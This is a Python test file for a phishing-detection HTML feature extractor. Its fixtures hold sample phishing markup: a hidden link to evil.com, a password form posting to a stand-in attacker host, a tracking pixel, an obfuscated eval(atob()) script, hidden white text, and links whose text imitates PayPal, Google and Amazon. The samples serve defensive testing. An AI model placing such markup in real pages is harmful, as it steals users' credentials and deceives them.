"""
Tests for html_features.py — covers link mismatch detection, hidden text,
external forms, tracking pixels, base64 content, and JavaScript detection.
"""

from __future__ import annotations

import pytest

from src.features.html_features import extract_html_features


PHISHING_HTML = """<!DOCTYPE html>
<html>
<body>
<a href="http://evil.com/steal" style="display:none;">paypal.com</a>
<a href="http://phishing.net/login">Click here to verify</a>
<form action="http://external-attacker.com/collect" method="post">
  <input type="password" name="pass">
</form>
<img src="http://tracker.evil.com/pixel.gif" width="1" height="1">
<script>eval(atob("YWxlcnQoInBoaXNoaW5nIik="));</script>
<p style="color:white;background:white;font-size:0px;">hidden text phishing keywords here</p>
<img src="data:image/png;base64,iVBORw0KGgoAAAA">
</body>
</html>"""

LEGITIMATE_HTML = """<!DOCTYPE html>
<html>
<body>
<h1>Welcome to Our Newsletter</h1>
<p>Thanks for subscribing. <a href="https://legit.com/unsubscribe">Unsubscribe here</a>.</p>
<a href="https://legit.com/terms">Terms of Service</a>
</body>
</html>"""

EMPTY_HTML = ""

MISMATCHED_LINKS_HTML = """<html><body>
<a href="http://evil-fake-paypal.com/login">paypal.com</a>
<a href="http://another-evil.net/steal">www.google.com</a>
<a href="http://three-evil.org/">amazon.com</a>
</body></html>"""


class TestPhishingHTMLDetection:
    def test_external_form_detected(self):
        feats = extract_html_features(PHISHING_HTML)
        assert feats["external_form_action"] == 1

    def test_javascript_detected(self):
        feats = extract_html_features(PHISHING_HTML)
        assert feats["javascript_count"] >= 1

    def test_tracking_pixel_detected(self):
        feats = extract_html_features(PHISHING_HTML)
        assert feats["tracking_pixel_count"] >= 1

    def test_base64_content_detected(self):
        feats = extract_html_features(PHISHING_HTML)
        assert feats["base64_content_count"] >= 1

    def test_hidden_text_detected(self):
        feats = extract_html_features(PHISHING_HTML)
        assert feats["hidden_text_count"] >= 1

    def test_href_text_mismatch_detected(self):
        feats = extract_html_features(MISMATCHED_LINKS_HTML)
        assert feats["href_text_mismatch_count"] >= 1


class TestLegitimateHTMLDetection:
    def test_no_external_form(self):
        feats = extract_html_features(LEGITIMATE_HTML)
        assert feats["external_form_action"] == 0

    def test_no_tracking_pixels(self):
        feats = extract_html_features(LEGITIMATE_HTML)
        assert feats["tracking_pixel_count"] == 0

    def test_links_counted(self):
        feats = extract_html_features(LEGITIMATE_HTML)
        assert feats["total_links"] >= 2


class TestEmptyHTMLHandling:
    def test_empty_string_returns_zeros(self):
        feats = extract_html_features(EMPTY_HTML)
        assert isinstance(feats, dict)
        assert feats.get("total_links", 0) == 0

    def test_none_input_handled(self):
        feats = extract_html_features(None)
        assert isinstance(feats, dict)
